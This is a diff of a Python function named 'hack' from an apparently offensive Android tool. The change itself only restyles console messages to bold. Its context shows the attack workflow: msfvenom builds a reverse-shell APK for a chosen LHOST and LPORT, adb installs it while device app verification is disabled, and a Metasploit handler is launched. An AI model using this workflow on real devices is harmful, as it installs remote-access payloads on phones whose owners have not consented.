@@ -17,44 +17,44 @@ def hack(config: AppConfig) -> None:
     choice = ask("[prompt]> [/prompt]")
 
     if choice != "":
-        console.print("[green]Returning to Main Menu.[/green]")
+        console.print("[bold green]Returning to Main Menu.[/bold green]")
         return
 
     os.system(config.clear_cmd)
     ip = get_ip_address()
     if ip is None:
         console.print(
-            "[yellow]Could not auto-detect LAN IP. Using [bold]127.0.0.1[/bold] — press [bold]M[/bold] to set LHOST.[/yellow]"
+            "[bold yellow]Could not auto-detect LAN IP. Using [bold]127.0.0.1[/bold] — press [bold]M[/bold] to set LHOST.[/bold yellow]"
         )
         ip = "127.0.0.1"
     lport = "4444"
     console.print(
-        f"[cyan]LHOST[/cyan] [white]{ip}[/white]  [cyan]LPORT[/cyan] [white]{lport}[/white]"
+        f"[bold cyan]LHOST[/bold cyan] [bold white]{ip}[/bold white]  [bold cyan]LPORT[/bold cyan] [bold white]{lport}[/bold white]"
     )
 
     modify = ask(
-        "[yellow]Enter = continue · M = edit LHOST/LPORT[/yellow]> "
+        "[bold yellow]Enter = continue · M = edit LHOST/LPORT[/bold yellow]> "
     ).lower()
 
     while modify not in ("m", ""):
-        modify = ask("[red]Enter or M[/red]> ").lower()
+        modify = ask("[bold red]Enter or M[/bold red]> ").lower()
 
     if modify == "m":
-        ip = ask("[cyan]LHOST[/cyan]> ").strip()
-        lport_in = ask("[cyan]LPORT[/cyan]> ").strip()
+        ip = ask("[bold cyan]LHOST[/bold cyan]> ").strip()
+        lport_in = ask("[bold cyan]LPORT[/bold cyan]> ").strip()
         if not is_valid_ipv4(ip):
-            console.print("[red]Invalid LHOST → 127.0.0.1[/red]")
+            console.print("[bold red]Invalid LHOST → 127.0.0.1[/bold red]")
             ip = "127.0.0.1"
         if lport_in.isdigit() and 1 <= int(lport_in) <= 65535:
             lport = lport_in
         else:
-            console.print("[yellow]Invalid LPORT → 4444[/yellow]")
+            console.print("[bold yellow]Invalid LPORT → 4444[/bold yellow]")
 
     if not confirm(
         "[bold red]WARNING:[/bold red] Payload install, security settings changes, Metasploit. "
         "Authorized testing only. Continue?"
     ):
-        console.print("[green]Cancelled.[/green]")
+        console.print("[bold green]Cancelled.[/bold green]")
         return
 
     console.print(banner.hacking_banner)
@@ -78,10 +78,10 @@ def hack(config: AppConfig) -> None:
             text=True,
         )
     if result.returncode != 0:
-        console.print(f"[red]msfvenom failed:[/red] {result.stderr or result.stdout}")
+        console.print(f"[bold red]msfvenom failed:[/bold red] {result.stderr or result.stdout}")
         return
     if not apk_out.is_file():
-        console.print("[red]test.apk missing[/red]")
+        console.print("[bold red]test.apk missing[/bold red]")
         return
 
     with task_status("[info]Preparing device (home, verify settings)…[/info]"):
@@ -98,7 +98,7 @@ def hack(config: AppConfig) -> None:
         )
     if install.returncode != 0:
         detail = (install.stdout + install.stderr).strip() or f"exit code {install.returncode}"
-        console.print(f"[red]adb install failed:[/red] {detail}")
+        console.print(f"[bold red]adb install failed:[/bold red] {detail}")
         with task_status("[info]Restoring app verification…[/info]"):
             adb(["shell", "settings", "put", "global", "package_verifier_enable", "1"])
             adb(["shell", "settings", "put", "global", "verifier_verify_adb_installs", "1"])
@@ -111,7 +111,7 @@ def hack(config: AppConfig) -> None:
         adb(["shell", "input", "keyevent", "22"])
         adb(["shell", "input", "keyevent", "66"])
 
-    console.print("[red]Starting msfconsole handler…[/red]")
+    console.print("[bold red]Starting msfconsole handler…[/bold red]")
     subprocess.run(
         [
             msfconsole,
